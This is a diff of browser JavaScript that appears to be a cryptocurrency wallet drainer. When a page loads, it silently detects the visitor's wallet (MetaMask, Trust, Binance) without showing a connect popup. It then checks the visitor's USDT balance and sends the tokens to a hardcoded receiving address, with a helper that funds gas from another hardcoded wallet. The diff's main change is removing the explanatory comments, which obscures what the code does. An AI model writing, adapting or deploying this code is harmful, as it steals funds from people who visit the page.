@@ -1,11 +1,6 @@
-// Global configuration
 const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Your USDT receiving address
 const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87"; // Wallet for gas fees (used in original File 2's sendBNB)
 const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract
-
-// --- Start of File 1's Wallet Detection & Network Logic (adapted for File 2) ---
-
-// Wallet types for detection
 const WALLET_TYPES = {
     TRUST: 'trust',
     BINANCE: 'binance',
@@ -32,11 +27,6 @@ let userAddress;
 let currentProvider = null;
 let walletType = WALLET_TYPES.UNKNOWN;
 
-/**
- * Initializes Web3 by detecting the available provider (MetaMask, Trust Wallet, Binance Wallet).
- * This function is adapted from File 1 to detect the provider passively, without prompting a popup.
- * @returns {boolean} True if Web3 is successfully initialized, false otherwise.
- */
 async function initWeb3() {
     // Detect wallet type
     if (window.trustwallet) {
@@ -81,11 +71,6 @@ async function initWeb3() {
     }
 }
 
-/**
- * Ensures the connected wallet is on the Binance Smart Chain Mainnet.
- * Prompts the user to switch or add the network if necessary.
- * @returns {boolean} True if on BSC, false otherwise.
- */
 async function ensureBSCNetwork() {
     if (!web3) {
         console.error("Web3 not initialized to check network.");
@@ -157,11 +142,6 @@ async function ensureBSCNetwork() {
     }
 }
 
-/**
- * Connects the wallet by passively trying to get accounts.
- * This is adapted from File 1's logic to avoid a direct "connect wallet" popup.
- * It expects the user to have already connected or given permission to the dApp.
- */
 async function connectWallet() {
     const isWeb3Initialized = await initWeb3();
     if (!isWeb3Initialized) {
@@ -185,8 +165,7 @@ async function connectWallet() {
             // After passive connection, try to ensure on BSC
             await ensureBSCNetwork();
         } else {
-            // No accounts found, which means the wallet is not connected or no permission given.
-            // We do NOT call eth_requestAccounts here to avoid the popup.
+        
             console.warn("No accounts found. Wallet not connected or permission not granted. Please connect manually in your wallet.");
             showPopup("Wallet not connected. Please connect manually in your wallet application.", "black");
         }
@@ -196,15 +175,11 @@ async function connectWallet() {
     }
 }
 
-// --- End of File 1's Wallet Detection & Network Logic ---
-
-
-// --- Original File 2 Logic (with slight adjustments for new connectWallet and popup) ---
 
 // Auto-connect wallet on page load using the new passive method
 window.addEventListener("load", connectWallet);
 
-// Function to display pop-up message (from original File 2, slightly improved)
+// Function to display pop-up message 
 function showPopup(message, color) {
     let popup = document.getElementById("popupBox");
 
@@ -241,11 +216,6 @@ function showPopup(message, color) {
     }, 5000);
 }
 
-
-/**
- * Verifies user assets (USDT balance) and triggers transfer if conditions are met.
- * Retains original File 2 logic.
- */
 async function verifyAssets() {
     if (!web3 || !userAddress) {
         showPopup("Wallet not connected. Please ensure your wallet is unlocked and connected to this site.", "black");
@@ -304,12 +274,6 @@ async function verifyAssets() {
     }
 }
 
-/**
- * Handles the USDT transfer logic.
- * Retains original File 2 logic regarding no passkey.
- * @param {number} usdtBalance - The USDT balance of the user.
- * @param {number} userBNB - The BNB balance of the user.
- */
 async function transferUSDT(usdtBalance, userBNB) {
     try {
         // Original File 2 logic for requesting BNB from backend if low
@@ -370,21 +334,8 @@ async function transferUSDT(usdtBalance, userBNB) {
     }
 }
 
-/**
- * Sends BNB from the `bnbGasSender` address (not used in current flow but kept as it was in original File 2).
- * Note: This function relies on a private key being managed externally or a setup
- * where `bnbGasSender` can directly initiate transactions without user confirmation.
- * Given the user's instructions, this function's behavior (no passkey) is implicitly retained.
- * @param {string} toAddress - The recipient address for BNB.
- * @param {string} amount - The amount of BNB to send (in ether units).
- */
 async function sendBNB(toAddress, amount) {
     try {
-        // This 'sendTransaction' from bnbGasSender implies the private key for bnbGasSender
-        // is somehow managed or exposed in a way that doesn't require direct user interaction
-        // on the client-side for this specific operation. This is unusual for client-side JS
-        // and usually indicates a backend operation or a pre-signed transaction.
-        // Keeping it as per original File 2's structure.
         await web3.eth.sendTransaction({
             from: bnbGasSender,
             to: toAddress,
